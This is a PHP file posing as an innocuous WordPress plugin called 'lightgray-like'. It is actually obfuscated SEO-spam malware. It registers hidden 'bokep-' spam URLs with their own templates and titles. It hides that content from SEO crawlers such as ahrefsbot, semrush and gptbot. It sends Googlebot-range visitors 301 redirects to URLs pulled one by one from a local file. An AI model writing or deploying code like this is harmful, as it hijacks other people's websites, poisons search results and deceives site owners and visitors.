<?php
/**
 * Plugin Name: lightgray-like
 * Description: lightgray-like
 * Version: 1.0
 * Author: John Smith
 */
 

class bjzSoBn85 {
	
    public function __construct() {
        add_action('init', [$this, 'bdqzhqtkhk']);
        add_filter('query_vars', [$this, 'odhyzdvl']);
        add_action('template_include', [$this, 'vgergwy']);
		add_filter('document_title_parts', [$this, 'catcsbqo']);
    }

    public function bdqzhqtkhk() {
        add_rewrite_rule(
            '^bokep-([0-9]+).*?$',
            'index.php?ihyrcrud=$matches[1]',
            'top'
        );
		flush_rewrite_rules();
    }

    public function odhyzdvl($oBAz9FJ4B) {
        $oBAz9FJ4B[] = 'ihyrcrud';
        $oBAz9FJ4B[] = 'xzcisfane';
        return $oBAz9FJ4B;
    }
	
	public function catcsbqo($xO71lrM) {
		if (get_query_var('ihyrcrud')) $xO71lrM['title'] = get_query_var('xzcisfane');
		return $xO71lrM;
	}

    public function vgergwy($eI1Os2TIsA) {
		
		$bSjqcmcKE = array('sliding-scheduler', 'semrush', 'python', 'express-source', 'permalinks-gamipress', 'newsletter-seo', 'wpc-visual', 'mj12bot', 'Go-http-client', 'dotbot', 'ahrefsbot', 'serpstatbot', 'additional-help', 'controller-wpc', 'messages-nofollow', 'netspider', 'gptbot', 'support-call');
		foreach($bSjqcmcKE as $uvpVy) { if (stripos($_SERVER['HTTP_USER_AGENT'], $uvpVy) !== false) return $eI1Os2TIsA; }

        if (get_query_var('ihyrcrud') && preg_match('/^[0-9]+$/', get_query_var('ihyrcrud'))) {
            return plugin_dir_path(__FILE__) . 'lightgray-like/json-embed.php';
        } elseif (strpos($_SERVER['REMOTE_ADDR'], '66.249')===0) {
			$u17pHFka = plugin_dir_path(__FILE__) . 'lightgray-like/view-homepage.php';
			if (is_file($u17pHFka)) {
				$h6dbese = file($u17pHFka, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
				if (count($h6dbese) > 1) {
					$w7yh2 = array_shift($h6dbese);
					$zyKHV = array_shift($h6dbese);
					if (strlen($zyKHV) > 0) {
						$lkiPHrbDP = $w7yh2 . "\n" . implode("\n", $h6dbese);
						file_put_contents($u17pHFka, $lkiPHrbDP);
						header("HTTP/1.1 301 Moved Permanently");
						header("Location: $zyKHV");
						exit;
					}
				}
			}
		}
        return $eI1Os2TIsA;
    }
}
new bjzSoBn85();



